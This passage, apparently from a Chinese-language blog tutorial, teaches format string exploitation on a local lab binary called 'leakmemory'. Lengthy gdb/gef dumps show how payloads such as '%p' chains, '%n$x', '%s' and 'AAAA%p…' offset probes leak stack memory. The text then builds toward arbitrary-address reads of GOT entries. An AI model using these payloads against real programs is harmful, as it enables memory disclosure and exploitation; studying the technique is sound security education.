inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，此时已经进入了printf函数中，<strong>栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。</strong>继续运行程序。</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p><pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0xffffd008 "%08x.%08x.%08x") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%08x.%08x.%08x"$ebx   : 0x0       $ecx   : 0x7fffffd6$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe4│+0x0008: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%08x.%08x.%08x")[#1] 0x804852c → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，由于格式化字符串为%x%x%x，所以，程序会将栈上的第三个地址开始处(也就是0xffffcfe4)及其以后的数值分别作为第一、第二、第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果，和想象中一致。</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.ffffd008.f7ffd918.00f0b5ff[Inferior 1 (process 4193) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然，我们也可以使用%p来获取数据，如下</p><pre><code>gef➤  rStarting program: /home/devil/leakmemory %p.%p.%p00000001.22222222.ffffffff.%p.%p.%p0xffffd008.0xf7ffd918.0xf0b5ff[Inferior 1 (process 4253) exited normally]</code></pre><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p><strong>那么有没有办法直接获取栈中被视为第n+1个参数的值呢？</strong></p><p>方法如下：</p><pre><code>%n$x</code></pre><p>利用如上的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>我们再次以gdb调试一下。</p><pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gdb leakmemorygef➤  b printfBreakpoint 1 at 0x8048370gef➤  rStarting program: /home/devil/leakmemory %3$xBreakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%3$x"$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  "%3$x"0xffffcfe4│+0x0018: 0xffffd008  →  "%3$x"0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()gef➤  cContinuing.00000001.22222222.ffffffff.%3$xBreakpoint 1, __printf (format=0xffffd008 "%3$x") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%3$x"$ebx   : 0x0       $ecx   : 0x7fffffe0$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  "%3$x"0xffffcfe4│+0x0008: 0xffffd008  →  "%3$x"0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%3$x")[#1] 0x804852c → main()gef➤  cContinuing.f0b5ff[Inferior 1 (process 4290) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈上第一个值是返回地址，第二个值是格式化字符串地址，第三个是格式化字符串第一个参数，第四个是格式化字符串第二个参数，第五个是格式化字符串第三个参数，也就是我们要输出的0x00f0b5ff。<strong>注意，格式化字符串的第三个参数是printf函数输出的第四个参数。</strong></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemorygef➤  b printfBreakpoint 1 at 0x8048370gef➤  rStarting program: /home/devil/leakmemory %sBreakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0018: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()gef➤  cContinuing.00000001.22222222.ffffffff.%sBreakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x7fffffe2$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%s")[#1] 0x804852c → main()gef➤  cContinuing.%s[Inferior 1 (process 4344) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，在第二次执行printf函数的时候，确实将0xffffcfe4处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 4 个参数，如下，此时程序就不能够解析，就崩溃了。</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %3$s00000001.22222222.ffffffff.%3$sSegmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>小技巧总结</strong></p><blockquote><ol><li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li><li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li><li>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</li></ol></blockquote><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p><p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串在栈上的(因为是某个函数的局部变量，本例中s是main函数的局部变量)。那么也就是说，在调用输出函数的时候，其实，<strong>第一个参数的值其实就是该格式化字符串的地址。</strong>我们选择上面的某个函数调用为例</p><pre class="line-numbers language-shell"><code class="language-shell">Breakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x7fffffe2$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffd008,同时该地址存储的也确实是”%s”格式化字符串内容。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><pre><code>addr%k$s</code></pre><blockquote><p>注：在这里，如果格式化字符串在栈上，那么我们就一定能确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少地域格式化字符串地址8字节或者16字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><pre><code>[tag]%p%p%p%p...</code></pre><p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其它字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p><pre><code>devil@ubuntu:~$ ./leakmemory AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pAAAA0xff9e92880xf7f959180xf0b5ff0xff9e92ae0x10xc20x10x222222220xffffffff0x414141410x702570250x702570250x702570250x702570250x70257025</code></pre><p>这里0x414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第11个参数，也是格式化字符串的第10个参数。(此处和CTF-Wiki上有出入)我们可以来测试一下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %10$s00000001.22222222.ffffffff.%10$sSegmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemorygef➤  rStarting program: /home/devil/leakmemory %10$s00000001.22222222.ffffffff.%10$sProgram received signal SIGSEGV, Segmentation fault.__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:5151    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0x24303125 ("%10$"?)$ebx   : 0x0       $ecx   : 0xf7fb6000  →  0x001b1db0$edx   : 0x1       $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000$esi   : 0xffffc680  →  0xffffffff$edi   : 0xf7fb6d60  →  0xfbad2a84$eip   : 0xf7e795cf  →  <__strlen_ia32+15> cmp BYTE PTR [eax], dh$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp0xffffc4f0│+0x0004: "%10$"0xffffc4f4│+0x0008: 0x000000000xffffc4f8│+0x000c: 0x00000028 ("("?)0xffffc4fc│+0x0010: 0x000000000xffffc500│+0x0014: 0xffffd008  →  "%10$s"0xffffc504│+0x0018: 0x000000000xffffc508│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e795c8 <__strlen_ia32+8> add    BYTE PTR [ecx], ah   0xf7e795ca <__strlen_ia32+10> ret    0x2474   0xf7e795cd <__strlen_ia32+13> jp     0xf7e795e6 <__strlen_ia32+38> → 0xf7e795cf <__strlen_ia32+15> cmp    BYTE PTR [eax], dh   0xf7e795d1 <__strlen_ia32+17> je     0xf7e79676 <__strlen_ia32+182>   0xf7e795d7 <__strlen_ia32+23> inc    eax   0xf7e795d8 <__strlen_ia32+24> cmp    BYTE PTR [eax], dh   0xf7e795da <__strlen_ia32+26> je     0xf7e79676 <__strlen_ia32+182>   0xf7e795e0 <__strlen_ia32+32> inc    eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e795cf in __strlen_ia32 (), reason: SIGSEGV───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e795cf → __strlen_ia32()[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x0, nspecs_done=0x0, lead_str_end=0xffffd008 "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)[#3] 0xf7e4d696 → __printf(format=0xffffd008 "%10$s")[#4] 0x804852c → main()gef➤  help x/Examine memory: x/FMT ADDRESS.ADDRESS is an expression for the memory address to examine.FMT is a repeat count followed by a format letter and a size letter.Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),  t(binary), f(float), a(address), i(instruction), c(char), s(string)  and z(hex, zero padded on the left).Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).The specified number of objects of the specified size are printedaccording to the format.Defaults for format and size letters are those previously used.Default count is 1.  Default address is following last thing printedwith this command or "print".gef➤  x/x 0xffffd0080xffffd008:    0x24303125gef➤  vmmap[ Legend:  Code | Heap | Stack ]Start      End        Offset     Perm Path0x08048000 0x08049000 0x00000000 r-x /home/devil/leakmemory0x08049000 0x0804a000 0x00000000 r-- /home/devil/leakmemory0x0804a000 0x0804b000 0x00001000 rw- /home/devil/leakmemory0x0804b000 0x0806c000 0x00000000 rw- [heap]0xf7e03000 0xf7e04000 0x00000000 rw- 0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fb4000 0xf7fb6000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so0xf7fb6000 0xf7fb7000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so0xf7fb7000 0xf7fba000 0x00000000 rw- 0xf7fd3000 0xf7fd4000 0x00000000 rw- 0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 